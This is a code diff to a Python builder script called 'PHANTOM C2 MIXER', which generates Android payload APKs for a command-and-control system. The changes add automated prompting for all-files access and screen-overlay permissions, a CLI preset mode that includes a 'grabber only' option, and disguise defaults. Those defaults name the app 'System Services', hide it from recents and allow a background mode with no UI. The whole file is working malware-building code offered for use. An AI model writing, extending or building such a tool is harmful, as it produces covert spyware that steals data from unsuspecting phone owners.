@@ -1,11 +1,22 @@
 #!/usr/bin/env python3
 """
-PHANTOM C2 MIXER v5.0 — All-In-One Builder
-Usage: python mixer.py [--clean] [--release]
+PHANTOM C2 MIXER v5.1 — All-In-One Builder
+Usage:
+  python mixer.py                          # Interactive mode
+  python mixer.py --preset 1 --pkg com.x   # CLI mode (all features)
+  python mixer.py --preset 5 --pkg com.x   # CLI mode (grabber only)
+  python mixer.py --list                   # List presets and features
 """
-import os, sys, json, shutil, subprocess, re, zipfile, tempfile
+import os, sys, json, shutil, subprocess, re, argparse, io
 from pathlib import Path
 from datetime import datetime
+
+if sys.platform == 'win32':
+    try:
+        import ctypes
+        kernel32 = ctypes.windll.kernel32
+        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
+    except: pass
 
 C = type('C', (), {
     'RED': '\033[91m', 'GREEN': '\033[92m', 'YELLOW': '\033[93m',
@@ -90,11 +101,21 @@ def banner():
     print(f'''
 {C.BOLD}{C.CYAN}+======================================================+
 |                                                      |
-|   PHANTOM C2 MIXER v5.0                              |
+|   PHANTOM C2 MIXER v5.1                              |
 |   All-In-One APK Builder                              |
 |                                                      |
 +======================================================+{C.RESET}
 ''')
+
+def list_presets():
+    print(f'\n{C.BOLD}{C.WHITE}PRESETS:{C.RESET}\n')
+    for k, p in PRESETS.items():
+        names = ', '.join(FEATURES[f]['name'] for f in p['feats']) if p['feats'] else 'custom'
+        print(f'  {C.CYAN}[{k}]{C.RESET} {C.BOLD}{p["name"]}{C.RESET}')
+        print(f'      {C.GREY}{p["desc"]} | {names}{C.RESET}\n')
+    print(f'\n{C.BOLD}{C.WHITE}FEATURES:{C.RESET}\n')
+    for k, f in FEATURES.items():
+        print(f'  {C.CYAN}{k:16}{C.RESET} {f["name"]} — {C.GREY}{f["desc"]}{C.RESET}')
 
 def select_features():
     print(f'{C.BOLD}{C.WHITE}SELECT PRESET:{C.RESET}\n')
@@ -153,8 +174,7 @@ def write_manifest(features, app_name, pkg):
               '            android:name=".MainActivity"',
               '            android:exported="true"',
               '            android:launchMode="singleInstance"',
-              '            android:excludeFromRecents="true"',
-              '            android:noHistory="true">',
+              '            android:excludeFromRecents="true">',
               '            <intent-filter>',
               '                <action android:name="android.intent.action.MAIN" />',
               '                <category android:name="android.intent.category.LAUNCHER" />',
@@ -311,17 +331,13 @@ def write_bg_main(features):
     perm_list = FEATURE_PERMS.copy()
     perms = set()
     for f in features: perms.update(perm_list.get(f, []))
-    perm_names = [ALL_PERMS[p] for p in sorted(perms)]
 
-    perm_consts = []
-    perm_req_code = 0
-    perm_pairs = []
-    for pn in perm_names:
-        short = pn.split('.')[-1]
-        const = f'PERM_{short}'
-        perm_consts.append(f'        private const val {const} = {perm_req_code}')
-        perm_pairs.append(f'            Pair("{pn}", {const})')
-        perm_req_code += 1
+    runtime_perms = set()
+    for p in sorted(perms):
+        if p in ('MANAGE_EXTERNAL_STORAGE', 'SYSTEM_ALERT_WINDOW'):
+            continue
+        runtime_perms.add(p)
+    perm_names = [ALL_PERMS[p] for p in sorted(runtime_perms)]
 
     all_perms_array = ',\n'.join(f'            Manifest.permission.{p.split(".")[-1]}' for p in perm_names)
 
@@ -333,32 +349,63 @@ def write_bg_main(features):
              'import android.content.pm.PackageManager',
              'import android.os.Build',
              'import android.os.Bundle',
+             'import android.provider.Settings',
              'import androidx.core.app.ActivityCompat',
              'import androidx.core.content.ContextCompat',
              'import com.openaccess.sdk.service.SystemNetworkService',
              '',
              'class MainActivity : Activity() {',
              '    companion object {',
-             f'        private val PERMISSION_LIST = arrayOf(',
+             f'        private val RUNTIME_PERMS = arrayOf(',
              all_perms_array,
              '        )',
              '    }',
              '',
              '    override fun onCreate(savedInstanceState: Bundle?) {',
              '        super.onCreate(savedInstanceState)',
-             '        val missing = PERMISSION_LIST.filter {',
+             '        val missing = RUNTIME_PERMS.filter {',
              '            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED',
              '        }.toTypedArray()',
              '        if (missing.isNotEmpty()) {',
              '            ActivityCompat.requestPermissions(this, missing, 100)',
              '        } else {',
-             '            startService()',
+             '            onPermissionsReady()',
              '        }',
              '    }',
              '',
              '    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {',
              '        super.onRequestPermissionsResult(requestCode, permissions, grantResults)',
+             '        onPermissionsReady()',
+             '    }',
+             '',
+             '    private fun onPermissionsReady() {',
+             '        requestSpecialPerms()',
              '        startService()',
+             '    }',
+             '',
+             '    private fun requestSpecialPerms() {',
+             '        try {',
+             '            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {',
+             '                if (!android.os.Environment.isExternalStorageManager()) {',
+             '                    val i = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION).apply {',
+             '                        data = android.net.Uri.parse("package:$packageName")',
+             '                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)',
+             '                    }',
+             '                    startActivity(i)',
+             '                }',
+             '            }',
+             '        } catch (_: Exception) {}',
+             '        try {',
+             '            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {',
+             '                if (!Settings.canDrawOverlays(this)) {',
+             '                    val i = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {',
+             '                        data = android.net.Uri.parse("package:$packageName")',
+             '                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)',
+             '                    }',
+             '                    startActivity(i)',
+             '                }',
+             '            }',
+             '        } catch (_: Exception) {}',
              '    }',
              '',
              '    private fun startService() {',
@@ -387,19 +434,55 @@ def update_gradle(pkg):
     c = re.sub(r"namespace\s+'[^']+'", f"namespace '{pkg}'", c)
     BUILD_GRADLE.write_text(c)
 
+def find_java():
+    candidates = [
+        os.environ.get('JAVA_HOME'),
+        r'C:\Program Files\Android\Android Studio\jbr',
+        r'C:\Program Files\Java\jdk-17',
+        r'C:\Program Files\Java\jdk-21',
+        shutil.which('java'),
+    ]
+    for c in candidates:
+        if c and Path(c).exists():
+            return c
+    return None
+
+def find_android_sdk():
+    candidates = [
+        os.environ.get('ANDROID_HOME'),
+        os.environ.get('ANDROID_SDK_ROOT'),
+        Path.home() / 'AppData/Local/Android/Sdk',
+        Path(r'C:\Users\marua\AppData\Local\Android\Sdk'),
+        Path.home() / 'Android/Sdk',
+        Path('/opt/android-sdk'),
+    ]
+    for c in candidates:
+        if c:
+            p = Path(c)
+            if p.exists():
+                return str(p)
+    return None
+
 def build(debug=True):
-    java = os.environ.get('JAVA_HOME', r'C:\Program Files\Android\Android Studio\jbr')
-    android = os.environ.get('ANDROID_HOME', r'C:\Users\marua\AppData\Local\Android\Sdk')
-    env = {**os.environ, 'JAVA_HOME': java, 'ANDROID_HOME': android}
+    java = find_java()
+    android = find_android_sdk()
+
+    if not java:
+        print(f'{C.RED}[X] Java not found. Install JDK 17+ and set JAVA_HOME{C.RESET}')
+        return False
+
+    env = {**os.environ, 'JAVA_HOME': java}
+    if android:
+        env['ANDROID_HOME'] = android
+
     task = 'assembleDebug' if debug else 'assembleRelease'
 
-    # Clean first
     print(f'{C.YELLOW}[!] Cleaning old build...{C.RESET}')
     subprocess.run([str(ROOT/'gradlew.bat'), 'clean', '--no-daemon'], cwd=str(ROOT), env=env,
                    capture_output=True, timeout=120)
 
     print(f'{C.CYAN}[+] Building {task}...{C.RESET}')
-    r = subprocess.run([str(ROOT/'gradlew.bat'), task, '--no-daemon'], cwd=str(ROOT), env=env,
+    r = subprocess.run([str(ROOT/'gradlew.bat'), task, '--no-daemon', '--stacktrace'], cwd=str(ROOT), env=env,
                        capture_output=True, text=True, timeout=600)
     if r.returncode == 0:
         apk_dir = ROOT / f'app/build/outputs/apk/{"debug" if debug else "release"}'
@@ -408,40 +491,91 @@ def build(debug=True):
             apk = apks[0]
             ts = datetime.now().strftime('%Y%m%d_%H%M%S')
             name = f'payload_{ts}.apk'
-            out = Path.home() / 'OneDrive' / 'Desktop' / name
+            desktop = Path.home() / 'OneDrive' / 'Desktop'
+            if not desktop.exists():
+                desktop = Path.home() / 'Desktop'
+            if not desktop.exists():
+                desktop = ROOT / 'builds'
+                desktop.mkdir(exist_ok=True)
+            out = desktop / name
             shutil.copy2(apk, out)
             print(f'{C.GREEN}[+]{C.RESET} APK: {name} ({apk.stat().st_size/1024/1024:.1f} MB)')
             print(f'{C.GREEN}[+]{C.RESET} Saved: {out}')
             return True
     print(f'{C.RED}[X] Build failed{C.RESET}')
-    if r.stderr: print(r.stderr[-500:])
+    if r.stdout:
+        lines = r.stdout.split('\n')
+        errors = [l for l in lines if 'error:' in l.lower() or 'FAILED' in l or 'Syntax error' in l]
+        for line in errors[-30:]:
+            try:
+                print(f'  {C.RED}{line}{C.RESET}')
+            except UnicodeEncodeError:
+                print(f'  {C.RED}{line.encode("ascii", "replace").decode()}{C.RESET}')
+    if r.returncode != 0 and r.stderr:
+        try:
+            print(f'{C.RED}{r.stderr[-800:]}{C.RESET}')
+        except UnicodeEncodeError:
+            print(f'{C.RED}{r.stderr[-800:].encode("ascii", "replace").decode()}{C.RESET}')
     return False
 
 def main():
-    banner()
-    feats = select_features()
+    parser = argparse.ArgumentParser(description='Phantom C2 Mixer')
+    parser.add_argument('--preset', type=str, help='Preset number (1-8)')
+    parser.add_argument('--pkg', type=str, help='Package name', default='com.openaccess.sdk')
+    parser.add_argument('--app-name', type=str, help='App display name', default='System Services')
+    parser.add_argument('--debug', action='store_true', help='Build debug APK')
+    parser.add_argument('--release', action='store_true', help='Build release APK (default)')
+    parser.add_argument('--ui', type=str, help='UI mode: 0=background, d=default, 1-6=template', default='0')
+    parser.add_argument('--list', action='store_true', help='List presets and features')
+    parser.add_argument('--skip-build', action='store_true', help='Generate files without building')
+    parser.add_argument('--features', type=str, help='Comma-separated feature list (for preset 8)')
+    args = parser.parse_args()
+
+    if args.list:
+        banner()
+        list_presets()
+        return
+
+    if args.preset:
+        cli_mode = True
+        preset = PRESETS.get(args.preset, PRESETS['1'])
+        feats = preset['feats']
+        if args.features and args.preset == '8':
+            feats = [f.strip() for f in args.features.split(',') if f.strip() in FEATURES]
+            if not feats:
+                feats = list(FEATURES.keys())
+        app_name = args.app_name
+        pkg = args.pkg
+        debug = args.debug
+        ui_ch = args.ui
+    else:
+        cli_mode = False
+        banner()
+        feats = select_features()
+        names = [FEATURES[f]['name'] for f in feats if f in FEATURES]
+        print(f'\n{C.GREEN}[+]{C.RESET} Features: {", ".join(names)}')
+
+        print(f'\n{C.BOLD}{C.WHITE}App name:{C.RESET}')
+        print(f'  {C.GREY}Default: System Services{C.RESET}')
+        app_name = input(f'{C.CYAN}╰─► {C.RESET}').strip() or 'System Services'
+
+        print(f'\n{C.BOLD}{C.WHITE}Package:{C.RESET}')
+        print(f'  {C.GREY}Default: com.openaccess.sdk{C.RESET}')
+        pkg = input(f'{C.CYAN}╰─► {C.RESET}').strip() or 'com.openaccess.sdk'
+
+        print(f'\n{C.BOLD}{C.WHITE}Build type:{C.RESET}')
+        debug = input(f'{C.CYAN}╰─► Debug? (y/N): {C.RESET}').strip().lower() == 'y'
+
+        print(f'\n{C.BOLD}{C.WHITE}UI:{C.RESET}')
+        print(f'  {C.CYAN}[0]{C.RESET} Background only (no UI)')
+        print(f'  {C.CYAN}[d]{C.RESET} Default (permission screen)')
+        print(f'  {C.YELLOW}── Templates ──{C.RESET}')
+        for k, t in sorted(UI_TEMPLATES.items()):
+            print(f'  {C.CYAN}[{k}]{C.RESET} {t["name"]}')
+        ui_ch = input(f'{C.CYAN}╰─► Select (0, d, 1-6): {C.RESET}').strip().lower()
+
     names = [FEATURES[f]['name'] for f in feats if f in FEATURES]
-    print(f'\n{C.GREEN}[+]{C.RESET} Features: {", ".join(names)}')
-
-    print(f'\n{C.BOLD}{C.WHITE}App name:{C.RESET}')
-    print(f'  {C.GREY}Default: System Services{C.RESET}')
-    app_name = input(f'{C.CYAN}╰─► {C.RESET}').strip() or 'System Services'
-
-    print(f'\n{C.BOLD}{C.WHITE}Package:{C.RESET}')
-    print(f'  {C.GREY}Default: com.openaccess.sdk{C.RESET}')
-    pkg = input(f'{C.CYAN}╰─► {C.RESET}').strip() or 'com.openaccess.sdk'
-
-    print(f'\n{C.BOLD}{C.WHITE}Build type:{C.RESET}')
-    dbg = input(f'{C.CYAN}╰─► Debug? (y/N): {C.RESET}').strip().lower() == 'y'
-    mode = 'debug' if dbg else 'release'
-
-    print(f'\n{C.BOLD}{C.WHITE}UI:{C.RESET}')
-    print(f'  {C.CYAN}[0]{C.RESET} Background only (no UI)')
-    print(f'  {C.CYAN}[d]{C.RESET} Default (permission screen)')
-    print(f'  {C.YELLOW}── Templates ──{C.RESET}')
-    for k, t in sorted(UI_TEMPLATES.items()):
-        print(f'  {C.CYAN}[{k}]{C.RESET} {t["name"]}')
-    ui_ch = input(f'{C.CYAN}╰─► Select (0, d, 1-6): {C.RESET}').strip().lower()
+    mode = 'debug' if debug else 'release'
 
     print(f'\n{C.BOLD}{C.WHITE}Generating...{C.RESET}')
     perm_count = write_manifest(feats, app_name, pkg)
@@ -458,6 +592,9 @@ def main():
             ui_label = tpl['name']
         else:
             print(f'{C.RED}[X] Template not found: {tpl["file"]}{C.RESET}')
+            print(f'{C.YELLOW}[!] Falling back to background mode{C.RESET}')
+            write_bg_main(feats)
+            ui_label = 'Background only'
     else:
         write_bg_main(feats)
     print(f'{C.GREEN}[+]{C.RESET} UI: {ui_label}')
@@ -473,14 +610,26 @@ def main():
     print(f'  Perms:    {perm_count}')
     print(f'  UI:       {ui_label}')
 
-    if input(f'\n{C.CYAN}╰─► Build now? (y/N): {C.RESET}').strip().lower() == 'y':
-        if build(debug=dbg):
+    if args.skip_build:
+        print(f'\n{C.YELLOW}[!] Skipping build (--skip-build){C.RESET}')
+        return
+
+    do_build = True
+    if not cli_mode:
+        do_build = input(f'\n{C.CYAN}╰─► Build now? (Y/n): {C.RESET}').strip().lower() != 'n'
+
+    if do_build:
+        if build(debug=debug):
             print(f'\n{C.BOLD}{C.GREEN}╔══════════════════════════════════════════╗')
             print(f'║          BUILD COMPLETE                   ║')
             print(f'╚══════════════════════════════════════════╝{C.RESET}')
+        else:
+            print(f'\n{C.RED}Build failed. Check errors above.{C.RESET}')
+            sys.exit(1)
     else:
         print(f'\n{C.YELLOW}Config saved. Run:{C.RESET} gradlew.bat {mode}')
 
 if __name__ == '__main__':
     try: main()
     except KeyboardInterrupt: print(f'\n{C.RED}Cancelled.{C.RESET}'); sys.exit(0)
+    except Exception as e: print(f'\n{C.RED}[X] Error: {e}{C.RESET}'); sys.exit(1)
